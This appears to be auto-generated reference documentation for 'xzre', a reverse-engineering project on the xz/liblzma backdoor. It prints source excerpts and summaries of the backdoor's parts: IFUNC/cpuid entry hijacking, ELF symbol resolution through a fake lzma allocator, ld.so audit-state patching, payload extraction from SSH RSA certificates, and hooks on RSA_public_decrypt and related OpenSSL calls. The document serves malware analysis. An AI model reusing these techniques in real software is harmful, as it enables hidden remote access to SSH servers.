  "elf_get_code_segment": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Obtains the address and size of the first executable segment in the given ELF file\n\n  @param elf_info the parsed ELF context, which will be updated with the address and size of the code segment\n  @param pSize variable that will be populated with the page-aligned segment size\n  @return void* the page-aligned starting address of the segment",
  "elf_get_data_segment": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Obtains the address and size of the last read-write segment in the given ELF file\n  this is typically the segment that contains the following sections:\n  - .init_array .fini_array .data.rel.ro .dynamic .got\n\n  the parameter @p get_alignment controls if @p pSize should be populated with the segment size (when FALSE),\n  or with the segment alignment (when TRUE)\n\n  Used to store data in the free space after the segment created due to alignment:\n  - for liblzma at (return value + 0x10) is the backdoor_hooks_data_t struct pointed to by hooks_data_addr\n\n  @param elf_info the parsed ELF context, which will be updated with the address and size of the data segment\n  @param pSize variable that will be populated with either the page-aligned segment size, or the alignment size\n  @param get_alignment controls if alignment size should be returned instead of segment size\n  @return void* the page-aligned starting address of the segment",
  "elf_get_got_symbol": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Gets the GOT symbol with name @p encoded_string_id from the parsed ELF file\n\n  @param elf_info the parsed ELF context\n  @param encoded_string_id symbol to look for (encoded)\n  @return void* the address of the symbol, or NULL if not found",
  "elf_get_plt_symbol": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Gets the PLT symbol with name @p encoded_string_id from the parsed ELF file\n\n  @param elf_info the parsed ELF context\n  @param encoded_string_id symbol to look for (encoded)\n  @return void* the address of the symbol, or NULL if not found",
  "elf_get_reloc_symbol": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Searches the ELF relocations for a symbol having name @p encoded_string id\n  and relocation of type @p reloc_type\n\n  @param elf_info the parsed ELF context\n  @param relocs array of relocations to search in\n  @param num_relocs number of items in the array pointed by @p relocs\n  @param reloc_type type of relocation to consider (R_X86_64_*)\n  @param encoded_string_id symbol to look for (encoded)\n  @return void* the address of the symbol, or NULL if not found",
  "elf_get_rodata_segment": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Obtains the address and size of the last readonly segment in the given ELF file\n  this corresponds to the segment that typically contains .rodata\n\n  @param elf_info the parsed ELF context, which will be updated with the address and size of the rodata segment\n  @param pSize variable that will be populated with the page-aligned segment size\n  @return void* the page-aligned starting address of the segment",
  "elf_parse": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Parses the given in-memory ELF file into elf_info\n\n  @param ehdr pointer to the beginning of the ELF header\n  @param elf_info pointer to the structure that will hold the parsed information\n  @return BOOL TRUE if parsing completed successfully, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/elf_parse.c):\n    BOOL main_elf_parse(main_elf_t *main_elf){\n    \tif(!elf_parse(\n    \t\tmain_elf->dynamic_linker_ehdr,\n    \t\tmain_elf->elf_handles->dynamic_linker\n    \t)){\n    \t\treturn FALSE;\n    \t}\n    \tElf64_Sym *libc_stack_end_sym;\n    \tif(!(libc_stack_end_sym = elf_symbol_get(\n    \t\tmain_elf->elf_handles->dynamic_linker,\n    \t\tSTR_libc_stack_end,\n    \t\tSTR_GLIBC_2_2_5\n    \t))){\n    \t\treturn FALSE;\n    \t}\n    \telf_info_t *dynamic_linker = main_elf->elf_handles->dynamic_linker;\n    \tvoid **libc_stack_end_ptr = (void *)PTRADD(dynamic_linker->elfbase, libc_stack_end_sym->st_value);\n    \tif(!process_is_sshd(dynamic_linker, *libc_stack_end_ptr)){\n    \t\treturn FALSE;\n    \t}\n    \t*main_elf->__libc_stack_end = *libc_stack_end_ptr;\n    \treturn TRUE;\n    }",
  "elf_symbol_get": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Looks up an ELF symbol from a parsed ELF\n\n  @param elf_info the parsed ELF context\n  @param encoded_string_id string ID of the symbol name\n  @param sym_version optional string representing the symbol version (e.g. \"GLIBC_2.2.5\")\n  @return Elf64_Sym* pointer to the ELF symbol, or NULL if not found",
  "elf_symbol_get_addr": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Looks up an ELF symbol from a parsed ELF, and returns its memory address\n\n  @param elf_info the parsed ELF context\n  @param encoded_string_id string ID of the symbol name\n  @return void* the address of the symbol\n\nUpstream implementation excerpt (xzre/xzre_code/elf_symbol_get_addr.c):\n    void *elf_symbol_get_addr(elf_info_t *elf_info, EncodedStringId encoded_string_id){\n    \tElf64_Sym *sym = elf_symbol_get(elf_info, encoded_string_id, 0);\n    \tif(!sym){\n    \t\treturn NULL;\n    \t}\n    \n    \tif(sym->st_value && sym->st_shndx){\n    \t\treturn (void *)PTRADD(elf_info->elfbase, sym->st_value);\n    \t} else {\n    \t\treturn NULL;\n    \t}\n    }",
  "endbr64_instruction": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/endbr64_instruction.c):\n    BOOL is_endbr64_instruction(u8 *code_start, u8 *code_end, u32 low_mask_part){\n    \tif((code_end - code_start) > 3){\n    \t\treturn *code_start + (low_mask_part | 0x5E20000) == 0xF223;\n    \t}\n    \treturn FALSE;\n    }",
  "entry": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/entry.c):\n    unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame){\n    \tu32 a = 0, b = 0, c = 0, d = 0;\n    \telf_entry_ctx_t state;\n    \n    \tif(resolver_call_count == 1){\n    \t\tstate.symbol_ptr = (void *)1;\n    \t\tmemset(&state.got_ctx, 0x00, sizeof(state.got_ctx));\n    \t\tstate.frame_address = caller_frame;\n    \t\tbackdoor_init(&state, caller_frame);\n    \t}\n    \t++resolver_call_count;\n    \t_cpuid_gcc(cpuid_request, &a, &b, &c, &d);\n    \treturn a;\n    }",
  "extract_payload_message": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief locates the RSA modulus from the given sshbuf.\n  if found, the given @p sshbuf_data will be updated to point to the modulus data.\n  additionally, the length of the modulus will be written to @p out_payload_size\n\n  @param sshbuf_data sshbuf containing the payload message\n  @param sshbuf_size size of sshbuf data\n  @param out_payload_size output variable that will be populated with the size of the backdoor payload, if found\n  @param ctx the global context\n  @return BOOL TRUE if the payload was successfully located, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/extract_payload_message.c):\n    BOOL extract_payload_message(\n    \tstruct sshbuf *sshbuf,\n    \tsize_t sshbuf_size,\n    \tsize_t *out_payload_size,\n    \tglobal_context_t *ctx\n    ){\n    \tif(!sshbuf || sshbuf_size <= 6) return FALSE;\n    \tif(!out_payload_size || !ctx) return FALSE;\n    \tif(!ctx->STR_ssh_rsa_cert_v01_openssh_com) return FALSE;\n    \tif(!ctx->STR_rsa_sha2_256) return FALSE;\n    \n    \t// overflow check \n    \tif(sshbuf_size > PTRADD(sshbuf->d, sshbuf_size)) return FALSE;\n    \n    \tsize_t i = 0;\n    \tchar *cert_type = NULL;\n    \tfor(i=0; (sshbuf_size - i) >= 7; ++i){\n    \t\t// check for \"ssh-rsa\"\n    \t\tif(!strncmp(ctx->STR_ssh_rsa_cert_v01_openssh_com,  (const char *)&sshbuf->d[i], 7)\n    \t\t// check for \"rsa-sha2\"\n    \t\t|| !strncmp(ctx->STR_rsa_sha2_256, (const char *)&sshbuf->d[i], 7)){\n    \t\t\tcert_type = (char *)&sshbuf->d[i];\n    \t\t\tbreak;\n    \t\t}\n    \t}\n    \tif (i <= 7 || !cert_type){\n    \t\treturn FALSE;\n    \t}\n    \n    \tu8 *p = sshbuf->d;\n    \t// go backwards over  the length of the string and the length of the certificate, then extract it\n    \t// (this is the encoding used by ssh for network messages and can be seen in PHPseclib's `Strings::packSSH2`)\n    \tu32 length = __builtin_bswap32(*(u32 *)(p - 8));\n    \tif(length > 0x10000) return FALSE;\n    \n    \tu8 *data_end = (u8 *)(cert_type + length - 8);\n    \tu8 *sshbuf_end = sshbuf->d + sshbuf_size;\n    \t// encoded data can't overflow the sshbuf size\n    \tif(data_end >= sshbuf_end) return FALSE;\n    \n    \tsize_t remaining = sshbuf_size - i;\n    \tsize_t cert_type_namelen = c_strnlen(cert_type, remaining);\n    \tif(cert_type_namelen >= remaining) return FALSE;\n    \n    \t// go past the cert type string -> RSA exponent\n    \tp = (u8 *)(cert_type + cert_type_namelen);\n    \tlength = __builtin_bswap32(*(u32 *)p);\n    \tif(length > 0x10000) return FALSE;\n    \n    \t// skip data (RSA exponent)\n    \tp += length + sizeof(u32);\n    \tif(p >= data_end) return FALSE;\n    \n    \t// length of RSA modulus\n    \tlength = __builtin_bswap32(*(u32 *)p);\n    \tif(length > 0x10000) return FALSE;\n    \n    \tu8 *modulus_data = p;\n    \tsize_t modulus_length = length;\n    \n    \t// skip data (RSA modulus)\n    \tp += length + sizeof(u32);\n    \tif(p >= data_end) return FALSE;\n    \n    \t// ??\n    \tif(*modulus_data == 0){\n    \t\t++modulus_data;\n    \t\t--modulus_length;\n    \t}\n    \n    \tsshbuf->d = modulus_data;\n    \t*out_payload_size = modulus_length;\n    \treturn TRUE;\n    \n    \n    }",
  "fake_lzma_alloc": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief a fake alloc function called by lzma_alloc() that then calls elf_symbol_get_addr()\n\n  @param opaque the parsed ELF context (elf_info_t*)\n  @param nmemb not used\n  @param size string ID of the symbol name (EncodedStringId)\n  @return void* the address of the symbol\n\nUpstream implementation excerpt (xzre/xzre_code/fake_lzma_alloc.c):\n    void *fake_lzma_alloc(void *opaque, size_t nmemb, size_t size){\n    \telf_info_t *elf_info = (elf_info_t *)opaque;\n    \tEncodedStringId string_id = (EncodedStringId)size;\n    \treturn elf_symbol_get_addr(elf_info, string_id);\n    }",
  "fake_lzma_free": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief a fake free function called by lzma_free()\n\n  this function is a red herring as it is does nothing except make it look like lzma_alloc() is the real deal\n\n  @param opaque not used\n  @param ptr not used\n\nUpstream implementation excerpt (xzre/xzre_code/fake_lzma_free.c):\n    void fake_lzma_free(void *opaque, void *ptr){}",
  "fd_read": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief reads data from the specified file descriptor\n\n  @param fd the file descriptor to read from\n  @param buffer the buffer to read data to\n  @param count number of bytes to read\n  @param funcs imported libc functions\n  @return ssize_t number of bytes read, or -1 on error",
  "fd_write": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief reads data to the specified file descriptor\n\n  @param fd the file descriptor to write to\n  @param buffer data to write\n  @param count number of bytes to write\n  @param funcs imported libc functions\n  @return ssize_t number of bytes written, or -1 on error",
  "find_add_instruction_with_mem_operand": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds an ADD instruction with an immediate memory operand\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param dctx disassembler context to hold the state\n  @param mem_address the expected address of the memory access\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_addr_referenced_in_mov_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief find an address referenced in a function\n\n  Note: There are some additional requirements on the mov instruction.\n\n  @param id the id of the function to look in\n  @param refs the string references\n  @param mem_range_start the start of the range the address lies within\n  @param mem_range_end the end of the range the address lies within\n  @return the address referenced if the exepected mov is found, or NULL otherwise",
  "find_call_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds a call instruction\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param call_target optional call target address. pass 0 to find any call\n  @param dctx empty disassembler context to hold the state\n  @return BOOL TRUE if found, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/find_call_instruction.c):\n    BOOL find_call_instruction(u8 *code_start, u8 *code_end, u8 *call_target, dasm_ctx_t *dctx){\n    \tif(!secret_data_append_from_address(NULL, (secret_data_shift_cursor_t){ 0x81 }, 4, 7)){\n    \t\treturn FALSE;\n    \t}\n    \tdasm_ctx_t ctx = {0};\n    \tif(!dctx){\n    \t\tdctx = &ctx;\n    \t}\n    \n    \twhile(code_start < code_end){\n    \t\tif(x86_dasm(dctx, code_start, code_end)){\n    \t\t\tif(XZDASM_OPC(dctx->opcode) == X86_OPCODE_CALL\n    \t\t\t\t&& (!call_target || &dctx->instruction[dctx->operand + dctx->instruction_size] == call_target)\n    \t\t\t){\n    \t\t\t\treturn TRUE;\n    \t\t\t}\n    \t\t\tcode_start += dctx->instruction_size;\n    \t\t} else {\n    \t\t\tcode_start += 1;\n    \t\t}\n    \t}\n    \treturn FALSE;\n    }\n    ",
  "find_dl_audit_offsets": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Find the various offsets in ld.so that need modification to trigger _dl_audit_symbind_alt() to call backdoor_symbind64().\n\n  First, this function finds the location and size of ld.so's _dl_audit_symbind_alt().\n\n  This function then calls find_link_map_l_name(), find_dl_naudit() and find_link_map_l_audit_any_plt() to get the various offsets required to modify ld.so's private audit state\n  so that _dl_audit_symbind_alt() will call backdoor_symbind64().\n\n  @param data\n  @param libname_offset output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored\n  @param hooks\n  @param imported_funcs\n  @return BOOL TRUE if successful, FALSE otherwise",
  "find_dl_naudit": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Find __rtld_global_ro offsets required to modify ld.so's private struct audit_ifaces state.\n\n  First, this function disassembles ld.so to search for the assert(GLRO(dl_naudit) <= naudit) from _dl_main().\n  This assert has a LEA instruction with an offset to ld.so's __rtld_global_ro::_dl_naudit.\n\n  This function disassembles ld.so's _dl_audit_symbind_alt() to verify it contains a LEA instruction with an offset that matches __rtld_global_ro::_dl_naudit.\n\n  This function then sets ldso_ctx::dl_naudit_offset and ldso_ctx::dl_naudit_offset to the offset from the start of __rtld_global_ro to\n  __rtld_global_ro::_dl_naudit and __rtld_global_ro::_dl_audit respectively.\n\n  This function also resolves a number of libcrypto function addresses.\n\n  @param dynamic_linker_elf elf_info_t for ld.so\n  @param libcrypto_elf elf_info_t for libcrypto\n  @param hooks\n  @param imported_funcs\n  @return BOOL TRUE if successful, FALSE otherwise",
  "find_function": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief locates the function boundaries.\n\n  @param code_start address to start searching from\n  @param func_start if provided, will be filled with the function's start address\n  @param func_end if provided, will be filled with the function's end address\n  @param search_base lowest search address, where search will be aborted\n  @param code_end address to stop searching at\n  @param find_mode\n  @return BOOL\n\nUpstream implementation excerpt (xzre/xzre_code/find_function.c):\n    BOOL find_function(\n    \tu8 *code_start,\n    \tvoid **func_start,\n    \tvoid **func_end,\n    \tu8 *search_base,\n    \tu8 *code_end,\n    \tFuncFindType find_mode\n    ){\n    \tu8 *res = NULL;\n    \t/** should we locate the function prologue? * /\n    \tif(func_start){\n    \t\tfor(u8 *p = code_start;\n    \t\t\tsearch_base < p && !find_function_prologue(p, code_end, &res, find_mode);\n    \t\t\t--p);\n    \n    \t\tif(!res || res == search_base && !find_function_prologue(search_base, code_end, NULL, find_mode)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*func_start = res;\n    \t}\n    \t/** should we locate the function epilogue? * /\n    \tif(func_end){\n    \t\tu8 *search_from = code_start + 1;\n    \t\tu8 *search_to = code_end - 4;\n    \t\tBOOL found;\n    \t\tfor(;search_from < search_to && \n    \t\t\t(found=find_function_prologue(search_from, code_end, NULL, find_mode)) == FALSE;\n    \t\t\t++search_from\n    \t\t);\n    \t\t// FIXME: in theory the first check is redundant, as it's covered by the second one\n    \t\tif(found || search_to != search_from || find_function_prologue(search_from, code_end, NULL, find_mode)){\n    \t\t\tcode_end = search_from;\n    \t\t}\n    \t\t*func_end = code_end;\n    \t}\n    \treturn TRUE;\n    }",
  "find_function_prologue": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief locates the function prologue\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param output pointer to receive the resulting prologue address, if found\n  @param find_mode prologue search mode/strategy\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_instruction_with_mem_operand": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds a LEA or MOV instruction with an immediate memory operand\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param dctx disassembler context to hold the state\n  @param mem_address the address of the memory fetch (where the instruction will fetch from)\n  @return BOOL TRUE if an instruction was found, FALSE otherwise",
  "find_instruction_with_mem_operand_ex": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds an instruction with an immediate memory operand\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param dctx disassembler context to hold the state\n  @param opcode opcode to look for, in encoded form (+0x80)\n  @param mem_address the expected address of the memory access\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_lea_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds a lea instruction\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param displacement the memory displacement operand of the target lea instruction\n  @return BOOL TRUE if found, FALSE otherwise\n\nUpstream implementation excerpt (xzre/xzre_code/find_lea_instruction.c):\n    BOOL find_lea_instruction(u8 *code_start, u8 *code_end, u64 displacement){\n    \n    \tif(!secret_data_append_from_call_site(\n    \t\t(secret_data_shift_cursor_t){ 0x7C }, \n    \t\t5, 6, 0)\n    \t){\n    \t\treturn FALSE;\n    \t}\n    \tdasm_ctx_t dctx = {0};\n    \tfor(;code_start < code_end; ++code_start){\n    \t\tif(x86_dasm(&dctx, code_start, code_end)\n    \t\t\t&& XZDASM_OPC(dctx.opcode) == X86_OPCODE_LEA\n    \t\t\t&& (dctx.flags2 & DF2_FLAGS_MEM) == DF2_MEM_DISP\n    \t\t\t&& (dctx.mem_disp == displacement || dctx.mem_disp == -displacement)\n    \t\t){\n    \t\t\treturn TRUE;\n    \t\t}\n    \t}\n    \treturn FALSE;\n    }",
  "find_lea_instruction_with_mem_operand": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds a LEA instruction with an immediate memory operand\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param dctx disassembler context to hold the state\n  @param mem_address the expected address of the memory access\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_link_map_l_audit_any_plt": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Find struct link_map offset required to modify ld.so's private link_map::l_audit_any_plt state.\n\n  First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a MOVZX instruction that fetches the link_map::l_audit_any_plt.\n  The first MOVZ instruction that uses an offset within the range from the start of struct link_map to libname_offset.\n\n  This function then calls find_link_map_l_audit_any_plt_bitmask() to get the bitmask required to modify link_map::l_audit_any_plt.\n\n  This function also resolves a libc function address.\n\n  @param data\n  @param libname_offset the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored\n  @param hooks\n  @param imported_funcs\n  @return BOOL TRUE if successful, FALSE otherwise",
  "find_link_map_l_audit_any_plt_bitmask": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Find the bitmask required to modify ld.so's private link_map::l_audit_any_plt state.\n\n  First, this function disassembles ld.so's _dl_audit_symbind_alt() to search for a sequence of MOVZ, OR, and TEST instructions that fetch the link_map::l_audit_any_plt.\n\n  This function then sets ldso_ctx::sshd_link_map_l_audit_any_plt_addr to the offset to the address of sshd's link_map::l_audit_any_plt flag;\n\n  This function also sets ldso_ctx::l_audit_any_plt_bitmask to the bitmask that sets the link_map::l_audit_any_plt flag.\n\n  This function also resolves a number of libc and libcrypto function addresses.\n\n  @param data\n  @param search_ctx the instruction addresses to search as well as the offset and output registers of the instructions to match\n  @return BOOL TRUE if successful, FALSE otherwise",
  "find_link_map_l_name": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Find struct link_map offsets required to modify ld.so's private struct auditstate state.\n\n  This function inspects ld.so's private struct link_map for liblzma.\n\n  First, this function finds the end of the link_map by searching for the private link_map::l_relro_addr and\n  link_map::l_relro_size with values that match liblzma's elf_info_t::gnurelro_vaddr and elf_info_t::gnurelro_memsize respectively.\n\n  This function then calculates libname_offset by searching for linkmap::l_name which points to a string stored just after the link_map by ld.so's _dl_new_object().\n\n  This function then sets ldso_ctx::libcrypto_l_name to the location of link_map::l_name for the libcrypto link_map.\n\n  This function disassembles ld.so's _dl_audit_preinit() and _dl_audit_symbind_alt() to verify both contain a LEA instruction with an offset that matches libname_offset.\n\n  This function also resolves a number of libc and libcrypto function addresses.\n\n  @param data_handle\n  @param libname_offset output of the offset from the start of the link_map to the location directly after where the link_map::l_name string data is stored\n  @param hooks\n  @param imported_funcs\n  @return BOOL TRUE if successful, FALSE otherwise",
  "find_mov_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds a MOV instruction.\n\n  @p load_flag specifies if the desired MOV should be a load:\n  @code mov reg, [mem] @endcode\n  or a store\n  @code mov [mem], reg @endcode\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param is_64bit_operand TRUE if MOV should have a 64bit operand, FALSE otherwise\n  @param load_flag TRUE if searching for load, FALSE for a store\n  @param dctx disassembler context to hold the state\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_mov_lea_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief like @ref find_mov_instruction, but also considers LEA instructions\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param is_64bit_operand TRUE if MOV should have a 64bit operand, FALSE otherwise\n  @param load_flag TRUE if searching for load, FALSE for a store\n  @param dctx disassembler context to hold the state\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_reg2reg_instruction": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds a reg2reg instruction\n\n  a reg2reg instruction is an x64 instruction with one of the following characteristics:\n  - a primary opcode of 0x89 (MOV/JNS)\n  or, alternatively, passing the following filter:\n  - ((0x505050500000505uLL >> (((dctx->opcode) & 0xFF) + 0x7F)) & 1) != 0\n  NOTE: the opcode in 'dctx->opcode' is the actual opcode +0x80\n  TODO: inspect x64 manual to find the exact filter\n\n  the instruction must also satisfy the following conditions:\n  - NOT have REX.B and REX.R set (no extension bits)\n  - MODRM.mod must be 3 (register-direct addressing mode)\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param dctx disassembler context to hold the state\n  @return BOOL TRUE if found, FALSE otherwise",
  "find_string_reference": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief finds an instruction that references the given string\n\n  @param code_start address to start searching from\n  @param code_end address to stop searching at\n  @param str the target of the string reference (i.e. the target of the LEA instruction)\n  @return u8* the address of the first instruction that references the given string, or NULL if not found\n\nUpstream implementation excerpt (xzre/xzre_code/find_string_reference.c):\n    u8 *find_string_reference(\n    \tu8 *code_start,\n    \tu8 *code_end,\n    \tconst char *str\n    ){\n    \tdasm_ctx_t dctx = {0};\n    \tif(find_lea_instruction_with_mem_operand(code_start, code_end, &dctx, (void *)str)){\n    \t\treturn dctx.instruction;\n    \t}\n    \treturn NULL;\n    }",
  "function": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/function.c):\n    BOOL find_function(\n    \tu8 *code_start,\n    \tvoid **func_start,\n    \tvoid **func_end,\n    \tu8 *search_base,\n    \tu8 *code_end,\n    \tFuncFindType find_mode\n    ){\n    \tu8 *res = NULL;\n    \t/** should we locate the function prologue? * /\n    \tif(func_start){\n    \t\tfor(u8 *p = code_start;\n    \t\t\tsearch_base < p && !find_function_prologue(p, code_end, &res, find_mode);\n    \t\t\t--p);\n    \n    \t\tif(!res || res == search_base && !find_function_prologue(search_base, code_end, NULL, find_mode)){\n    \t\t\treturn FALSE;\n    \t\t}\n    \t\t*func_start = res;\n    \t}\n    \t/** should we locate the function epilogue? * /\n    \tif(func_end){\n    \t\tu8 *search_from = code_start + 1;\n    \t\tu8 *search_to = code_end - 4;\n    \t\tBOOL found;\n    \t\tfor(;search_from < search_to && \n    \t\t\t(found=find_function_prologue(search_from, code_end, NULL, find_mode)) == FALSE;\n    \t\t\t++search_from\n    \t\t);\n    \t\t// FIXME: in theory the first check is redundant, as it's covered by the second one\n    \t\tif(found || search_to != search_from || find_function_prologue(search_from, code_end, NULL, find_mode)){\n    \t\t\tcode_end = search_from;\n    \t\t}\n    \t\t*func_end = code_end;\n    \t}\n    \treturn TRUE;\n    }",
  "get_cpuid_modified": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Patched _get_cpuid implementation that routes the first resolver invocation through backdoor_entry() and only issues CPUID when the advertised maximum leaf covers the requested value.\n\nNotes:\n  - Uses backdoor_entry() to install stage-two payloads while the IFUNC resolver is running.\n  - Returns 0 when the resolved CPUID limit is lower than the requested leaf, preserving glibc's contract.",
  "get_elf_functions_address": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief gets the address of the elf_functions\n\n  uses elf_functions_offset to get the address 0x2a0 bytes before elf_functions\n  and then adds 0x268 to get the final address of elf_functions\n  *\n  @return elf_functions_t*",
  "get_lzma_allocator": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief gets the fake LZMA allocator, used for imports resolution\n  the \"opaque\" field of the structure holds a pointer to @see elf_info_t\n\n  @return lzma_allocator*\n\nUpstream implementation excerpt (xzre/xzre_code/get_lzma_allocator.c):\n    lzma_allocator *get_lzma_allocator(void){\n    \treturn &get_lzma_allocator_address()->allocator;\n    }",
  "get_lzma_allocator_address": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief gets the address of the fake LZMA allocator\n\n  uses fake_lzma_allocator_offset to get the address 0x180 bytes before fake_lzma_allocator\n  and then adds 0x160 to get the final address of fake_lzma_allocator\n\n  called in get_lzma_allocator()\n\n  @return fake_lzma_allocator_t*",
  "get_string_id": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief Get the @see EncodedStringId for the given string\n  the string will be consumed until one of the following condition is reached (whichever happens first):\n  - 44 chars have been consumed (maximum string length)\n  - @p string_end is supplied and has been reached\n  - the string table has been exhausted\n\n  @param string_begin the string to get the ID for (max 44 chars)\n  @param string_end optional string end pointer\n  @return EncodedStringId the string ID matching the input string, or 0 if not found",
  "get_tls_get_addr_random_symbol_got_offset": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief get the tls_get_addr_random_symbol GOT offset\n\n  sets elf_entry_ctx_t::got_ptr = 0x2600\n  stores the index in elf_entry_ctx_t::got_offset\n\n  @param ctx\n  @return ptrdiff_t tls_get_addr_random_symbol GOT offset",
  "globals": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Consolidated definition of global data that the backdoor expects to find in .bss/.data (.e.g resolver_call_count, global_ctx, hook tables, relocation constants, and the serialized string tables).\n\nNotes:\n  - Most pointers are initialised to zero so the loader or runtime patches can populate them.\n  - The large constant arrays mirror blobs copied straight out of the original liblzma object (branch tables, CRC masks, etc.).",
  "got_offset": "AutoDoc: Generated from upstream sources.\n\nUpstream implementation excerpt (xzre/xzre_code/got_offset.c):\n    void update_got_offset(elf_entry_ctx_t *ctx){\n    \tctx->got_ctx.got_offset = cpuid_reloc_consts.cpuid_random_symbol_got_offset;\n    }",
  "hook_EVP_PKEY_set1_RSA": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Hook that forwards to the real EVP_PKEY_set1_RSA after first giving run_backdoor_commands() a chance to examine the RSA key.\n\nNotes:\n  - Reads the resolved function pointer from global_ctx->imported_funcs and bails out if the table is unavailable.\n  - When a key is present, invokes the backdoor to decide whether the original call should proceed and then tail-calls the genuine OpenSSL routine.",
  "hook_RSA_get0_key": "AutoDoc: Generated from reverse engineering.\n\nSummary:\n  Wrapper around RSA_get0_key that lets the backdoor observe RSA key material before delegating to the real implementation.\n\nNotes:\n  - Grabs the function pointer from global_ctx->imported_funcs and returns immediately if it is missing.\n  - Calls run_backdoor_commands() with the RSA handle, then jumps to the genuine RSA_get0_key entry point.",
  "hook_RSA_public_decrypt": "AutoDoc: Generated from upstream sources.\n\nSource summary (xzre/xzre.h):\n  @brief hook for RSA_public_decrypt, which triggers @see run_backdoor_commands\n\nUpstream implementation excerpt (xzre/xzre_code/hook_RSA_public_decrypt.c):\n    int hook_RSA_public_decrypt(\n    \tint flen, unsigned char *from,\n    \tunsigned char *to, RSA *rsa, int padding\n    ){\n    \tpfn_RSA_public_decrypt_t RSA_public_decrypt;\n    \n    \tif(!global_ctx) return 0;\n    \tif(!global_ctx->imported_funcs) return 0;\n    \tif(!(RSA_public_decrypt=global_ctx->imported_funcs->RSA_public_decrypt)) return 0;\n    \tif(!rsa){\n    \t\treturn RSA_public_decrypt(flen, from, to, rsa, padding);\n    \t}\n    \tBOOL call_orig = TRUE;\n    \tint result = run_backdoor_commands(rsa, global_ctx, &call_orig);\n    \tif(call_orig){\n    \t\treturn RSA_public_decrypt(flen, from, to, rsa, padding);\n    \t}\n    \treturn result;\n    }",
